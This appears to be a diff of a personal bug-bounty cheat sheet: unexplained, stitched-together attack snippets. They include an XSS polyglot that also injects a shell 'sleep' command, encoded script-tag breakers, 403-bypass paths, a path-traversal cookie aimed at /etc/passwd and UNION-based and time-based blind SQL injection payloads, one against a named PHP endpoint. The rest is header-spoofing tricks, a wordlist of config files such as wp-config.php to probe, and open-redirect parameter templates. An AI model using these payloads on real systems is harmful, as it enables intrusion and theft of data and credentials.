@@ -1,8 +1,46 @@
+
+
+</CrIPT>
+%3C%2F%53C%72I%50%54%2F%3E
+alert
+aler%26%23116;%3E
+
+\\yourhost?;sleep${IFS}10;'/*!90000or*/+/*"><%00svg/onload=confirm`{{8*8}}`>*/'1
+
+If '/something' => 403
+Try -
+'/something/'
+'/something/%20'
+'/something.html'
+'/something.json
+'/something/?anything'
+'/something#'
+Works sometimes
+Sign of the horns
+
+Happy hacking....!!! 
+
+
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+
+1. select '\f\l\a\g'='flag';  // This is true
+2.  All are same
+   *  select 'abcd'; 
+   *  select 0x61626364; 
+   *  select 0b01100001011000100110001101100100;
+3. select 'admin' = 'àdmin'; // is true if utf8 is allowed
+
+{"param":"11')))+UNION+SELECT+1,2,3,CONCAT(user(),version(),database()),5,6,7,8--+r0hack"}
+
+pass: changeme
+
 Cross-Site Scripting (XSS),
 Insecure Direct Object Reference (IDOR),
 Cross-Site Request Forgery (CSRF),
 Race Conditions,
 Information Disclosure.
+
+X-Custom-IP-Authorizition: 127.0.0.1
 
 
 X-Forwarded-For: 127.0.0.2
@@ -11,7 +49,7 @@ X-Remote-IP: 127.0.0.3
 X-Remote-Addr: 127.0.0.4
 X-Client-IP: 127.0.0.5
 X-Host: 127.0.0.6
-X-Forwarded-Host: http://f5392536fab4.ngrok.io
+X-Forwarded-Host: 127.0.0.1
 
 
 &res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
@@ -19,8 +57,86 @@ X-Forwarded-Host: http://f5392536fab4.ngrok.io
 :/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
 
 .*\.google\.com 
+.*\.googleapis\.com
 .*\.gstatic\.com
 .*\.mozilla\.com
-.*\.googleapis\.com
 .*\.pki\.goog
-No more noise i
+
+/api/v1/account/accounts/summaries
+
+/api/v1/account/oauth/token
+
+/api/v1/account/oauth/ticket
+
+/api/v1/account/permissions
+
+/api/v1/account/user
+
+/api/v1/account/user/assets
+
+/api/v1/account/user/delete
+
+/api/v1/account/user/profile
+
+/StateNameServer.exe.config
+/Sysindex.config
+/System.config
+/Web.confide
+/webconfig.php
+/webconfig.txt.php
+/wp-config.php
+/wp-includes/css/wp-config.php
+/wp-includes/fonts/wp-config.php
+/wp-includes/modules/wp-config.pop
+/xamlSyntax.config
+/xunit.console.exe.config
+/NHibernate.config
+/NLog.config
+/nunit-agent.exe.config
+/nunit-gui.exe.config
+/nunit-x86.exe.config
+/nunit.exe.config
+/Rhino.Commons.NHibernate.dll.config
+/runFile.exe.config
+/sconfig.php
+/services.config
+
+/{payload}
+
+ ?next={payload}
+
+ ?url={payload}
+
+ ?target={payload}
+
+ ?rurl={payload}
+
+ ?dest={payload}
+
+ ?destination={payload}
+
+ ?redir={payload}
+
+ ?redirect_url={payload}
+
+ ?redirect={payload}
+
+ /cgi-bin/redirect.cgi?{payload}
+
+ ?out={payload}
+
+ ?view={payload}
+
+ /login?to={payload}
+
+ ?image_url={payload}
+
+ ?go={payload}
+
+ ?return={payload}
+
+ ?checkout_url={payload}
+
+ ?continue={payload}
+
+ ?return_path={payload}
